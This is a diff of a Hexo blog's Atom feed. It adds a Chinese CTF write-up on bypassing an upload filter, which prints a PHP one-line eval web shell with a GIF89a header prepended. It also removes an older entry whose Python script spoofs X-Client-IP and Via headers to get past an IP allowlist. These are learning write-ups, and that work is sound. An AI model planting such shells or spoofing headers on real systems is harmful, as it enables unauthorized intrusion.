@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-03-06T10:08:12.642Z</updated>
+  <updated>2024-03-06T10:13:43.749Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>文件头绕过上传</title>
+    <link href="http://example.com/2024/03/05/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/"/>
+    <id>http://example.com/2024/03/05/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0/</id>
+    <published>2024-03-05T10:13:25.000Z</published>
+    <updated>2024-03-06T10:13:43.749Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>网页有上传文件的入口，先尝试上传一个一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cssec&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网页提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器检测到&lt;?php，启动了查杀程序。</span><br></pre></td></tr></table></figure><p>可能是对文件头或者文件内容的检验，修改一句话木马为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#x27;cssec&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p>添加gif的文件头，不会影响php的解析</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">文件 exp.php 已经上传。</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">文件路径: uploads/exp.php</span></span><br></pre></td></tr></table></figure><p>连接木马，得到flag</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;网页有上传文件的入口，先尝试上传一个一句话木马&lt;/p&gt;
+&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
+      
+    
+    
+    
+    <category term="文件上传" scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+    <category term="文件头绕过" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
   
   <entry>
     <title>MIME绕过上传</title>
@@ -478,33 +503,6 @@
     
     
     <category term="爬虫和爆破" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB%E5%92%8C%E7%88%86%E7%A0%B4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HTTP1</title>
-    <link href="http://example.com/2024/03/05/HTTP2/"/>
-    <id>http://example.com/2024/03/05/HTTP2/</id>
-    <published>2024-03-05T10:13:04.000Z</published>
-    <updated>2024-03-06T09:20:13.582Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文章详细内容，得到通关要求</p><ul><li>只接受POST方法访问</li><li>IP白名单：110.191.22.73 | 110.191.22.79 | 110.191.22.113</li><li>代理服务器信息：主机名为lutalica.time、HTTP版本为1.0、类型为Squid 3.1</li></ul><p>因此，需要修改访问时 HTTP 请求头的信息，可以通过 BurpSuite 拦截流量并修改请求头，也可以使用 Python 直接编写 exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://ctf.seek2.top:32775/post/post.php&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Client-IP&#x27;</span>: <span class="string">&#x27;110.191.22.73&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Via&#x27;</span>: <span class="string">&#x27;1.0 lutalica.time (Squid 3.1)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = target</span><br><span class="line"></span><br><span class="line">html = requests.post(url, headers=headers).text</span><br><span class="line"><span class="comment"># print(html)</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;flag.*&#x27;</span>, html))</span><br></pre></td></tr></table></figure><p>其中对检测 IP 的请求头做了限制，需要打印出返回信息调试</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;查看文章详细内容，得到通关要求&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;只接受POST方法访问&lt;/li&gt;
-&lt;li&gt;IP白名单：110.191.22.73 </summary>
-      
-    
-    
-    
-    <category term="HTTP" scheme="http://example.com/categories/HTTP/"/>
-    
-    
-    <category term="HTTP请求头" scheme="http://example.com/tags/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
     
   </entry>
   
